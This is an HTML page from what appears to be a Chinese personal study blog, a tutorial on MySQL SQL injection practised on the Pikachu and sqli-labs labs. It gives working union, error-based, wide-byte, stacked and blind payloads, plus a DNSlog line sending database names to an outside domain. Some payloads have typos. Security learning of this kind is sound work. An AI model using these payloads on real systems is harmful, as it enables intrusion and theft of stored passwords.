@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WEB攻防--sql注入 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>WEB攻防--sql注入</h1>
+    <div class="meta"><span class="chip date">2024-08-25</span><span class="chip">分类·渗透</span><span class="chip">#渗透</span></div>
+    <article><h1>sql注入</h1>
+<p><img src="https://pic.imgdb.cn/item/66c84ed5d9c307b7e94615ae.png" alt=""></p>
+<h2>原理</h2>
+<p>脚本代码在实现代码和数据库进行通讯时，讲定义的sql语句进行执行，其中sql能够通过参数来传递自定义值来实现控制sql语句，从而执行恶意的sql语句</p>
+<p>sql首要条件就是有参数，可控的参数，但不是说url没有参数就不能注入</p>
+<p>但是如果是这样的</p>
+<pre><code>xxx.xxx.xxx.xxx/admin_login.asp?id=1
+</code></pre>
+<p>是可以注入的</p>
+<p>如果有两个可变参数比如</p>
+<pre><code>xxx.xxx.xxx.xxx/admin_login.asp?id=1&amp;page=1
+</code></pre>
+<p>判断id有注入的时候应该尝试</p>
+<pre><code>xxx.xxx.xxx.xxx/admin_login.asp?id=1 注入语句  &amp; page=1
+</code></pre>
+<p>或者</p>
+<pre><code>xxx.xxx.xxx.xxx/admin_login.asp?page=1&amp;id=1  注入语句
+</code></pre>
+<p>mysql中<code># -- </code>是注释符的意思</p>
+<pre><code>mysql&gt; select id,email,username from member where username =&quot;vince&quot;;
++----+-------------------+----------+
+| id | email             | username |
++----+-------------------+----------+
+|  1 | vince@pikachu.com | vince    |
++----+-------------------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select id,email,username from member -- where username =&quot;vince&quot;;
+    -&gt; ;
++----+-------------------+----------+
+| id | email             | username |
++----+-------------------+----------+
+|  1 | vince@pikachu.com | vince    |
+|  2 | allen@pikachu.com | allen    |
+|  3 | kobe@pikachu.com  | kobe     |
+|  4 | grady@pikachu.com | grady    |
+|  5 | kevin@pikachu.com | kevin    |
+|  6 | lucy@pikachu.com  | lucy     |
+|  7 | lili@pikachu.com  | lili     |
++----+-------------------+----------+
+</code></pre>
+<p>为什么平常注入的时候要加&#39;呢，因为一般都是类似</p>
+<pre><code>$name=$_GET[&#39;name&#39;];
+$query=&#39;select id ,email,username from member where username=&#39;[name]&#39;;
+</code></pre>
+<p>当你注入<code>xx&#39; or 1=1 --+</code>这种的时候</p>
+<p>会变成</p>
+<pre><code>$name=$_GET[&#39;name&#39;];
+$query=&#39;select id ,email,username from member where username=&#39;xx&#39; or 1=1 --+&#39;;
+</code></pre>
+<p>在其中，&#39;xx&#39;提前闭合了，又因为or的原因导致1=1永真成立，使得sql语句成立</p>
+<h2>如何找注入点位置</h2>
+<p>还是那句话，找自定义变量的</p>
+<p>类似?xx=xxx这种的，可以一试</p>
+<p>有些交互的地方类似分页这种数据自动变化的，可能有limit的限制；</p>
+<pre><code>mysql&gt; select id,username from member limit 0,2;
+ERROR 2006 (HY000): MySQL server has gone away
+No connection. Trying to reconnect...
+Connection id:    17
+Current database: pikachu
+
++----+----------+
+| id | username |
++----+----------+
+|  1 | vince    |
+|  2 | allen    |
++----+----------+
+2 rows in set (0.01 sec)
+
+mysql&gt; select id,username from member limit 2,2;
++----+----------+
+| id | username |
++----+----------+
+|  3 | kobe     |
+|  4 | grady    |
++----+----------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select id,username from member limit 4,2;
++----+----------+
+| id | username |
++----+----------+
+|  5 | kevin    |
+|  6 | lucy     |
++----+----------+
+2 rows in set (0.00 sec)
+</code></pre>
+<p>理论上，只要与后端数据库进行交互的地方，都可能存在sql注入，甚至cookie这里面都可以，不止只局限于url里面的?xx=xx</p>
+<p>只要与后台有交互都可以(抓包)</p>
+<h2>联合注入</h2>
+<p>在网址中空格可以用+代替</p>
+<p>union联合查询需要有同样的列数</p>
+<pre><code>mysql&gt; select id,username from member union select username,password from users;
+ERROR 2006 (HY000): MySQL server has gone away
+No connection. Trying to reconnect...
+Connection id:    19
+Current database: pikachu
+
++---------+----------------------------------+
+| id      | username                         |
++---------+----------------------------------+
+| 1       | vince                            |
+| 2       | allen                            |
+| 3       | kobe                             |
+| 4       | grady                            |
+| 5       | kevin                            |
+| 6       | lucy                             |
+| 7       | lili                             |
+| admin   | e10adc3949ba59abbe56e057f20f883e |
+| pikachu | 670b14728ad9902aecba32e22fa4f6bd |
+| test    | e99a18c428cb38d5f260853678922e03 |
++---------+----------------------------------+
+10 rows in set (0.01 sec)
+</code></pre>
+<p>所以就可以使用</p>
+<pre><code>&#39; union select username,password from users#
+</code></pre>
+<p>出来的md5，你可以上cmd5进行解密
+<a href="cmd5.com">cmd5</a></p>
+<h2>简单常用测试语句和注释符号</h2>
+<p>在GET请求中，不允许出现空格，所以我们需要用+代替，当然你也可以用url编码
+POST中没有问题</p>
+<p><code>+</code>会自动识别为空格
+或者url编码为<code>%20</code></p>
+<p>sql中常见的注释符号就是<code>#以及--（--后面必须加一个空格，这就是常见的--+的来源）</code></p>
+<p>在GET请求中，url部分也不能出现#</p>
+<pre><code class="language-常见测试语句">引号测试
+
+加一个&quot;或者&#39;，看是否报错
+原因也很简单
+$query=&#39;select id ,email,username from member where username=&#39;[name]&#39;中，你只输入&#39;的话就成了
+$query=&#39;select id ,email,username from member where username=&#39;&#39;&#39;；
+前面两个引号已经闭合了，最后多的这个就报错了
+
+
+永真
+or 1=1 后面的1=1永真，前面的语句也为真就
+and 1=1 两个同时为真才真，查询结果和不加1=1一样，防护中有一种参数化查询，又名PDO预处理，参数化查询可能将&#39;1 and 1=1 &#39;整个当成name查询，正常输入&#39;1 and 1=1&#39;应该查询不到，但是如果查询到了说明可能没进行预处理，这时可以加一个永假，如果and 1=1查到了，and 1=2不行，说明存在
+
+永假
+and 1=2查询结果为假，啥都么的应该
+
+
+union select 联合查询
+</code></pre>
+<h2>sqk注入分类</h2>
+<p>主要分为数字型，字符型，搜索型，xx型</p>
+<h3>数字型</h3>
+<p>数据库中是</p>
+<pre><code>$query=&#39;select id ,email,username from member where id=$id;
+</code></pre>
+<p>这种id=$id的，数据库中类型是int类型（如果是int unsigned的话后面的unsigned说明不可为负号）</p>
+<h3>字符型</h3>
+<pre><code>$query=&#39;select id ,email,username from member where id=&quot;[name]&quot;;
+</code></pre>
+<h3>搜索型</h3>
+<p>可以使用模糊匹配</p>
+<pre><code>mysql&gt; select id,email from member where username like &quot;vin&quot;;
++----+-------------------+
+| id | email             |
++----+-------------------+
+|  1 | vince@pikachu.com |
++----+-------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p>=表示的是精确匹配，而对应的可以用like作为模糊匹配，%vin表示以vin结尾的。%表示的是通配符，</p>
+<pre><code class="language-对比一下">vin开头
+mysql&gt; select id,email from member where username like &quot;vin%&quot;;
++----+-------------------+
+| id | email             |
++----+-------------------+
+|  1 | vince@pikachu.com |
++----+-------------------+
+1 row in set (0.00 sec)
+
+
+vin结尾
+mysql&gt; select id,email from member where username like &quot;%vin&quot;;
++----+-------------------+
+| id | email             |
++----+-------------------+
+|  5 | kevin@pikachu.com |
++----+-------------------+
+1 row in set (0.00 sec)
+
+
+包含vin
+mysql&gt; select id,email from member where username like &quot;%vin%&quot;;
++----+-------------------+
+| id | email             |
++----+-------------------+
+|  1 | vince@pikachu.com |
+|  5 | kevin@pikachu.com |
++----+-------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+<p>也可以用上面的</p>
+<pre><code>xx&#39; or 1=1#
+</code></pre>
+<p>进行闭合</p>
+<h3>xx型</h3>
+<p>用一些特殊符号，像是()[]这种</p>
+<pre><code class="language-pikachu">$query=&#39;select id ,email,username from member where id=（&quot;[name]&quot;）；
+</code></pre>
+<p>注意要闭合括号</p>
+<pre><code>xx)&#39; or 1=1 --+
+</code></pre>
+<h3>json类型</h3>
+<h4>判断</h4>
+<pre><code>content-type:检查数据是什么格式，常用的有三个
+
+1.application/x-www-form-urlencoded,浏览器传输的时候的默认类型值
+urlencoded格式是  键值对  比如 id=1&amp;username=2&amp;passwd=3
+
+2.application/json,
+{[&quot;id&quot;:[（&quot;id&quot;：“xxx”）]]}这种,很明显的一大堆的json数据类型
+{&quot;name&quot;:&quot;vernus&quot;,&quot;password&quot;:&quot;123&quot;}这个也是json类型
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/66c9a281d9c307b7e921b5e4.png" alt=""></p>
+<p>根据不同的application，服务端的接收也不同</p>
+<p>多应用于前后端分离的项目，app，小程序，公众号</p>
+<p><img src="https://pic.imgdb.cn/item/66c9a46dd9c307b7e926e1ca.png" alt=""></p>
+<h4>json注入</h4>
+<p>跟正常的一样，但是键值对，键必须双引号，值字符串双引号，所以我们可以尝试用单引号注入</p>
+<p>可以在页面最下面</p>
+<pre><code>json={搞一个json的}，参考
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/66c9a619d9c307b7e9287dbb.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/66c9a6a3d9c307b7e9290244.png" alt=""></p>
+<h3>按提交方式分类</h3>
+<p><img src="https://pic.imgdb.cn/item/66c9a8c3d9c307b7e92b03ac.png" alt=""></p>
+<p>GET改urlencode的，POST改下面请求体的，cookie直接尝试就行</p>
+<h3>按请求位置分类</h3>
+<p><img src="https://pic.imgdb.cn/item/66c9aa3ed9c307b7e92c6c12.png" alt=""></p>
+<p>ua里面注入的话，可以考虑一下报错注入</p>
+<h3>mysql变量和 函数</h3>
+<pre><code>version                                 查看版本
+version_compile_os                      查看当前操作系统
+</code></pre>
+<p>使用的时候执行下面的即可</p>
+<pre><code>select @@语句
+</code></pre>
+<p>mysql内置函数，</p>
+<pre><code>mysql&gt; select database();
++------------+
+| database() |
++------------+
+| NULL       |
++------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select version();
++-----------+
+| version() |
++-----------+
+| 8.0.12    |
++-----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select user();
++----------------+
+| user()         |
++----------------+
+| root@localhost |
++----------------+
+1 row in set (0.00 sec)
+</code></pre>
+<h2>报错注入</h2>
+<p>适用于页面上没有任何反馈信息的</p>
+<p>常用的报错函数</p>
+<pre><code>Updatexml():函数是mysql对xml文档数据进行查询和修改的xpath函数
+extractvalue()：函数是mysqlxml文档进行查询的xpath函数
+floor():mysql中用于取整的函数
+</code></pre>
+<h4>updatexml</h4>
+<p>内容替换的</p>
+<p>updatexml（xml_document,xpath_string,new_value）</p>
+<p><img src="https://pic.imgdb.cn/item/66ca8675d9c307b7e94d495d.png" alt=""></p>
+<p>mysql的xpath</p>
+<p><img src="https://pic.imgdb.cn/item/66ca87a8d9c307b7e94e3ec3.png" alt=""></p>
+<p>中间的&#39;//&#39;是xpath，如上图判断的是/root/message/content里面的msg替换成
+I an fine,thank you</p>
+<p>concat拼接，</p>
+<pre><code>mysql&gt; select concat(&#39;hello&#39;,&#39;world&#39;);
+ERROR 2006 (HY000): MySQL server has gone away
+No connection. Trying to reconnect...
+Connection id:    10
+Current database: *** NONE ***
+
++-------------------------+
+| concat(&#39;hello&#39;,&#39;world&#39;) |
++-------------------------+
+| helloworld              |
++-------------------------+
+1 row in set (0.01 sec)
+</code></pre>
+<pre><code>mysql&gt; select updatexml(&#39;hello&#39;,concat(&#39;&gt;&gt;&#39;,(select version()),&quot;&lt;&lt;&quot;),&quot;world&quot;);
+ERROR 1105 (HY000): XPATH syntax error: &#39;&gt;&gt;8.0.12&lt;&lt;&#39;
+mysql&gt;
+</code></pre>
+<p>先在<code>select version()</code>外面加一层()使得其先执行</p>
+<h4>extractvalue()</h4>
+<p><img src="https://pic.imgdb.cn/item/66ca8a61d9c307b7e9509f3c.png" alt=""></p>
+<pre><code>mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;hello&lt;/b&gt;&lt;/a&gt;&#39;,&#39;/a/b&#39;);
++--------------------------------------------+
+| ExtractValue(&#39;&lt;a&gt;&lt;b&gt;hello&lt;/b&gt;&lt;/a&gt;&#39;,&#39;/a/b&#39;) |
++--------------------------------------------+
+| hello                                      |
++--------------------------------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p>也可以结合着来</p>
+<pre><code>mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;hello&lt;/b&gt;&lt;/a&gt;&#39;,concat(&quot;&gt;&gt;&quot;,(select @@version)));
+ERROR 1105 (HY000): XPATH syntax error: &#39;&gt;&gt;8.0.12&#39;
+</code></pre>
+<h4>相关语句</h4>
+<pre><code>爆版本
+1&#39; and updatexml(1,concat(ox7e,(select version()),0x7e),1)#
+
+爆当前用户
+1&#39; and updatexml(1,concat(ox7e,(select user()),0x7e),1)#
+
+爆当前数据库
+1&#39; and updatexml(1,concat(ox7e,(select dastabase()),0x7e),1)#
+
+爆表
+mysql5.1以上版本会有一个叫information_schema的默认数据库，这个库记录着整个mysql管理的数据库的名称，表明，库名，列名
+所以我们可以通过他获取表明，以皮卡丘为例
+
+1&#39; and updatexml(1,concat(ox7e,(select table_name from information_schema,tables where table_schema=&#39;pakachu&#39;)),1)#,
+
+但是反馈回的错误数据只能显示一行，所以我们要加limit限制
+
+1&#39; and updatexml(1,concat(ox7e,(select table_name from information_schema,tables where table_schema=&#39;pakachu&#39; limit 0,1)),1)#,
+
+更改limit后面的0实现遍历
+
+爆字段
+1&#39; and updatexml(1,concat(0x7e,(select password from information_schema.columns where table_name=&quot;users&quot; and table_schema=&quot;pikachu&quot; limit 0,1)),0)#
+
+爆字段内容
+1&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#
+</code></pre>
+<h2>增删改查注入</h2>
+<p>简单来说就是不只有select可以注入,insert,update,delete啥的都行</p>
+<h2>宽字节注入</h2>
+<p>有些php网站，为了防止sql注入，经常才用引号转义的方式，比如打开全局GPC配置
+<img src="https://pic.imgdb.cn/item/66ca943fd9c307b7e95feefc.png" alt=""></p>
+<p>比如</p>
+<pre><code>xx&#39; or 1=1#
+
+经过转义就成了
+
+xx\&#39; or 1=1#
+</code></pre>
+<p>引号天然丢失
+所以呢，我们可以在前面加%df这样，%5c是\，%df是中但是连起来的%df%5C就是一个运（应该是个繁体的）字，这样就避开了转义，宽字节就是将\变成汉字吃掉</p>
+<h2>偏移量注入</h2>
+<p>union的前提是查询的两个里面有相同列的</p>
+<pre><code>mysql&gt; select * from users union select username,email from member;
+ERROR 1222 (21000): The used SELECT statements have a different number of column
+</code></pre>
+<p>所以我们可以进行偏移，前面补上1，2，3，4，这种</p>
+<pre><code>mysql&gt; select * from users union select 1,2,username,email from member;
++----+----------+----------------------------------+-------------------+
+| id | username | password                         | level             |
++----+----------+----------------------------------+-------------------+
+|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |
+|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |
+|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |
+|  1 | 2        | vince                            | vince@pikachu.com |
+|  1 | 2        | allen                            | allen@pikachu.com |
+|  1 | 2        | kobe                             | kobe@pikachu.com  |
+|  1 | 2        | grady                            | grady@pikachu.com |
+|  1 | 2        | kevin                            | kevin@pikachu.com |
+|  1 | 2        | lucy                             | lucy@pikachu.com  |
+|  1 | 2        | lili                             | lili@pikachu.com  |
++----+----------+----------------------------------+-------------------+
+10 rows in set (0.00 sec)
+</code></pre>
+<p>知道表明，不知道列名的时候用偏移量注入，联合查询前面查询语句列数要和诸如后面的union列数要多</p>
+<p>感觉讲的有点懵懵的，我的理解就是，你正常的union联合查询需要前后的列数一样，所以为了一致我们要加1，2，3，4，5，6...这种来填补，但是我们在输出的时候，查询的，额，比如</p>
+<pre><code>mysql&gt; select * from users union select 1,2,username,email from member;
++----+----------+----------------------------------+-------------------+
+| id | username | password                         | level             |
++----+----------+----------------------------------+-------------------+
+|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |
+|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |
+|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |
+|  1 | 2        | vince                            | vince@pikachu.com |
+|  1 | 2        | allen                            | allen@pikachu.com |
+|  1 | 2        | kobe                             | kobe@pikachu.com  |
+|  1 | 2        | grady                            | grady@pikachu.com |
+|  1 | 2        | kevin                            | kevin@pikachu.com |
+|  1 | 2        | lucy                             | lucy@pikachu.com  |
+|  1 | 2        | lili                             | lili@pikachu.com  |
++----+----------+----------------------------------+-------------------+
+</code></pre>
+<p>这种，username是第二列，我们就不能直接用<code>1,2,3,users.*</code>来进行，不然下面的就被掩盖了，上面那个就是被掩盖的，正确的是这个</p>
+<pre><code>+----+----------+----------------------------------+-------------------+
+| id | username | password                         | level             |
++----+----------+----------------------------------+-------------------+
+|  1 | admin    | e10adc3949ba59abbe56e057f20f883e | 1                 |
+|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd | 2                 |
+|  3 | test     | e99a18c428cb38d5f260853678922e03 | 3                 |
+|  1 | vince    | 2                                | vince@pikachu.com |
+|  1 | allen    | 2                                | allen@pikachu.com |
+|  1 | kobe     | 2                                | kobe@pikachu.com  |
+|  1 | grady    | 2                                | grady@pikachu.com |
+|  1 | kevin    | 2                                | kevin@pikachu.com |
+|  1 | lucy     | 2                                | lucy@pikachu.com  |
+|  1 | lili     | 2                                | lili@pikachu.com  |
++----+----------+----------------------------------+-------------------+
+</code></pre>
+<h2>加密注入</h2>
+<p>前端给后端注入有时候是加密的，所以有时候要进行加密的注入</p>
+<p>加密算法可能在某个js代码中，min的是经过压缩，额，好像不叫这个，就是加了一定的混淆的，详细的请玩js逆向</p>
+<h2>堆叠注入</h2>
+<p>就是一堆sql语句执行</p>
+<p><img src="https://pic.imgdb.cn/item/66cadc43d9c307b7e9bab1f3.png" alt=""></p>
+<p>前面通过;已经结束了，后面的语句可以任意写</p>
+<h3>限制</h3>
+<p>堆叠注入是否能成，取决于后端代码，
+例如</p>
+<p><img src="https://pic.imgdb.cn/item/66cadd29d9c307b7e9bb70a2.png" alt=""></p>
+<h2>二次注入</h2>
+<p>第一次注入，第二次触发</p>
+<p>举个例子，在注册框注册一个admin&#39;# 的，他不会被转义，二十存储在数据库中，但是当你修改密码的时候，他后面的&#39;#会被转义，这时候你修改的admin&#39;#就变成了修改admin的密码了</p>
+<p>sqli-labs-24</p>
+<h2>中转注入（不好弄）</h2>
+<p>就是你截取一个数据包，然后发到中转的，再从中转转发到url</p>
+<p><img src="https://pic.imgdb.cn/item/66cae012d9c307b7e9bdf455.png" alt=""></p>
+<p>这是一个php进行base64加密的</p>
+<h2>伪静态注入</h2>
+<p><img src="https://pic.imgdb.cn/item/66cae16fd9c307b7e9bf2038.png" alt=""></p>
+<p>这种就在伪静态后加，比如/1/就在/1 后面加<code>&#39; or 1=1#</code></p>
+<p>就是嗯加</p>
+<h2>回显和无回显</h2>
+<p>主要就是盲注</p>
+<p><img src="https://pic.imgdb.cn/item/66caeed6d9c307b7e9d23598.png" alt=""></p>
+<p>上面这个，无回显，但是他做了一个判断，上面的做了一个查询条数的判断，结果不为1就输出不存在</p>
+<p>但是为什么报错注入也没有呢，因为mysqli_query，默认不打印报错信息</p>
+<p>或者在ini中对error设置成了off</p>
+<h2>布尔盲注</h2>
+<p>通过比较手段得到一个真假值，根据真假值断定数据是什么的</p>
+<pre><code>mysql&gt; select username,email from member where username=&quot;vince&quot; and length(database())=8;
+Empty set (0.00 sec)
+
+mysql&gt; select username,email from member where username=&quot;vince&quot; and length(database())=7;
++----------+-------------------+
+| username | email             |
++----------+-------------------+
+| vince    | vince@pikachu.com |
++----------+-------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p>当然，皮卡丘中的也可以这么做</p>
+<pre><code>vince&quot; and ascii(substr(database(),1,1))=112#
+</code></pre>
+<p>其中第一个1是length，但是盲注我们一般都直接上sqlmap跑</p>
+<h2>时间盲注</h2>
+<p>就是看延迟,sleep(5)--+
+但是光延迟没啥用，我们可以拼接一下</p>
+<pre><code>mysql&gt; select if(1&gt;2,&#39;a&#39;,&#39;b&#39;);
+ERROR 2006 (HY000): MySQL server has gone away
+No connection. Trying to reconnect...
+Connection id:    15
+Current database: pikachu
+
++-----------------+
+| if(1&gt;2,&#39;a&#39;,&#39;b&#39;) |
++-----------------+
+| b               |
++-----------------+
+1 row in set (0.01 sec)
+</code></pre>
+<p>mysql中存在着一个if判断语句，上面的意思为如果1&gt;2，输出a，反之输出b</p>
+<p>我们就可以进一步利用，比如</p>
+<pre><code>mysql&gt; select if(substr(database(),1,1)=&quot;p&quot;,sleep(5),&quot;2&quot;);
++---------------------------------------------+
+| if(substr(database(),1,1)=&quot;p&quot;,sleep(5),&quot;2&quot;) |
++---------------------------------------------+
+| 0                                           |
++---------------------------------------------+
+1 row in set (5.01 sec)
+</code></pre>
+<p>这里是判断数据库第一个名字是不是p，是的话延迟5秒，否则输出2</p>
+<p>此外出了sleep还有一个benchmark也可以进行时间盲注</p>
+<p>benchmark（100000.md5(1)）是将md5(1)执行100000次以达到延迟的效果</p>
+<pre><code>mysql&gt; select benchmark(1000000,md5(123));
++-----------------------------+
+| benchmark(1000000,md5(123)) |
++-----------------------------+
+|                           0 |
++-----------------------------+
+1 row in set (0.10 sec)
+
+mysql&gt; select benchmark(10000000,md5(123));
++------------------------------+
+| benchmark(10000000,md5(123)) |
++------------------------------+
+|                            0 |
++------------------------------+
+1 row in set (0.94 sec)
+</code></pre>
+<p>可以看到肉眼可见的时间增加，就是不知道为啥人家1000000次是2.34s我是0.94，🤔</p>
+<h2>dnslog注入</h2>
+<p>在网站的下级域名的时候随便加，比如</p>
+<pre><code>or load_file(&quot;http://database().www.xxx.com&quot;)
+</code></pre>
+<p>在开放日志记录的网站就记录下来了</p>
+<p>网站</p>
+<p>我实验的时候都没成功登上去过，奇了怪了<a href="www.dnslog.com">dnslog</a>,另外一个是
+   <a href="http://ceye.io/records/http">ceye</a>  ，这个倒是登上去了，就是卡的一批奥
+之前好像写过一次dns外带的，我就不详细了，下面这个师傅一看就是看jadon老师的，</p>
+<p><a href="https://blog.csdn.net/qq_56607768/article/details/124224966">https://blog.csdn.net/qq_56607768/article/details/124224966</a></p>
+<h2>前端代码绕过</h2>
+<p>这玩意等我后面看到js加解密和js逆向再说</p>
+<h2>后端代码绕过</h2>
+<p>这个就是那些，额，和文件上传差不多，大小写，双写，宽字节，</p>
+<p><img src="https://pic.imgdb.cn/item/66caf5ffd9c307b7e9df706c.png" alt=""></p>
+<h2>总结</h2>
+<p>至此,mysql的sql注入应该是都么的了，后面还剩下木马,防护手段,getshell以及其他数据库的注入，那些明儿在说，懒了懒了</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
